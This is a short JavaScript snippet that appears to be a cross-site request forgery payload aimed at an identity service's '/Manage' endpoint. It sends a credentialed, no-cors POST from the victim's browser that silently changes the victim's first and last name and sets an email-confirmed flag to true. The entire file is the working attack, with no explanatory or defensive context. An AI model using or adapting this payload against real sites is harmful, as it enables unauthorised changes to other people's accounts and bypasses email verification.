var firstname = "Tara";
var lastname= "MyNewLastname";
var email= "True"
var host = "https://identity.cybiquity.io";
var manage = "/Manage";
var create_params = "sEmailConfirmed=" + email +"&FirstName=" + firstname + "&LastName=" + lastname;
function send_create() { 
  console.log("Modifying User..."); 
  fetch(host+manage, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : create_params }
  ).then(function(response) {
    isdone();
  }); 
}

function isdone() { 
  console.log("Done"); 
  
}

send_create();
